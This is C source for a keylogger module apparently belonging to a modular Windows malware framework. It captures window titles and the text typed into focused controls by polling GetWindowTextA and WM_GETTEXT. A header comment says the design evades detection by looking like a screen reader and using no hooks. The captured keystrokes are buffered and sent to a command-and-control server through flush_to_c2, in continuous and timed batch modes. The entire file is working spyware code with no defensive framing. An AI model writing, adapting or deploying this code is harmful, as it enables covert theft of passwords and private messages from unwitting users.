// chunk: collectors/keylogger_uiautomation
// depends: core/emit_buffer
// provides: poll_keys, flush_keylog, run_self_test, persistent_keylog, batch_keylog
// headers: windows.h
// libs: ole32, oleaut32
// note: UI Automation text change monitoring — looks like a screen reader, no hooks

#ifndef CHUNK_KEYLOGGER_UIAUTOMATION
#define CHUNK_KEYLOGGER_UIAUTOMATION

#ifndef FLUSH_INTERVAL_MS
#define FLUSH_INTERVAL_MS 30000
#endif

#ifndef BATCH_DURATION_MS
#define BATCH_DURATION_MS 30000
#endif

static char g_keylog_buf[32768];
static int  g_keylog_pos = 0;
static char g_last_window[256] = {0};
static char g_last_text[4096] = {0};

static void flush_to_c2(void);

static void log_key(int vk) { (void)vk; }

static void poll_keys(void) {
    char wnd_title[256] = {0};
    HWND fg = GetForegroundWindow();
    if (!fg) return;
    GetWindowTextA(fg, wnd_title, sizeof(wnd_title));
    if (wnd_title[0] && strcmp(wnd_title, g_last_window) != 0) {
        int n = snprintf(g_keylog_buf + g_keylog_pos,
                         sizeof(g_keylog_buf) - g_keylog_pos,
                         "\r\n[%s]\r\n", wnd_title);
        if (n > 0) g_keylog_pos += n;
        strncpy(g_last_window, wnd_title, sizeof(g_last_window) - 1);
    }

    GUITHREADINFO gti = {0};
    gti.cbSize = sizeof(gti);
    if (!GetGUIThreadInfo(0, &gti) || !gti.hwndFocus) return;

    char text[4096] = {0};
    int len = GetWindowTextA(gti.hwndFocus, text, sizeof(text) - 1);
    if (len <= 0) {
        SendMessageTimeoutA(gti.hwndFocus, WM_GETTEXT, sizeof(text) - 1,
                            (LPARAM)text, SMTO_ABORTIFHUNG, 100, NULL);
        len = (int)strlen(text);
    }
    if (len <= 0) return;

    if (strcmp(text, g_last_text) != 0) {
        int old_len = (int)strlen(g_last_text);
        if (len > old_len && strncmp(text, g_last_text, old_len) == 0) {
            const char *delta = text + old_len;
            int dlen = len - old_len;
            if (g_keylog_pos + dlen < (int)sizeof(g_keylog_buf) - 4) {
                memcpy(g_keylog_buf + g_keylog_pos, delta, dlen);
                g_keylog_pos += dlen;
            }
        } else if (len < old_len && strncmp(text, g_last_text, len) == 0) {
            int bscount = old_len - len;
            for (int i = 0; i < bscount && g_keylog_pos + 4 < (int)sizeof(g_keylog_buf); i++) {
                memcpy(g_keylog_buf + g_keylog_pos, "[BS]", 4);
                g_keylog_pos += 4;
            }
        } else {
            int n = snprintf(g_keylog_buf + g_keylog_pos,
                             sizeof(g_keylog_buf) - g_keylog_pos,
                             "{%s}", text);
            if (n > 0) g_keylog_pos += n;
        }
        strncpy(g_last_text, text, sizeof(g_last_text) - 1);
    }
}

static void flush_keylog(void) {
    if (g_keylog_pos == 0) return;
    emitf("=== KEYLOG ===\r\n");
    emit(g_keylog_buf, (DWORD)g_keylog_pos);
    emitf("\r\n\r\n");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();
}

static int run_self_test(void) {
    int before = g_keylog_pos;
    if (g_keylog_pos + 8 < (int)sizeof(g_keylog_buf)) {
        memcpy(g_keylog_buf + g_keylog_pos, "X9", 2);
        g_keylog_pos += 2;
    }
    return (g_keylog_pos > before) ? 1 : 0;
}

static void persistent_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    g_last_text[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));

    int self_test_ok = run_self_test();
    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (mode=uiautomation_persistent, self_test=%s)\r\n\r\n",
           self_test_ok ? "PASS" : "FAIL");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();

    DWORD last_flush = GetTickCount();
    for (;;) {
        poll_keys();
        DWORD now = GetTickCount();
        if ((now - last_flush >= FLUSH_INTERVAL_MS && g_keylog_pos > 0) ||
            g_keylog_pos >= (int)sizeof(g_keylog_buf) - 256) {
            flush_keylog();
            last_flush = now;
        }
        Sleep(100);
    }
}

static void batch_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    g_last_text[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));

    DWORD start = GetTickCount();
    while (GetTickCount() - start < (DWORD)(BATCH_DURATION_MS - 3000)) {
        poll_keys();
        Sleep(100);
    }

    int self_test_ok = run_self_test();
    while (GetTickCount() - start < BATCH_DURATION_MS) {
        poll_keys();
        Sleep(100);
    }

    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (duration=%dms, self_test=%s, keys=%d, method=uiautomation)\r\n\r\n",
           BATCH_DURATION_MS, self_test_ok ? "PASS" : "FAIL", g_keylog_pos);
    if (g_keylog_pos > 0) {
        emitf("=== KEYLOG CAPTURE (%d ms) ===\r\n", BATCH_DURATION_MS);
        emit(g_keylog_buf, (DWORD)g_keylog_pos);
        emitf("\r\n\r\n");
    }
}

#endif
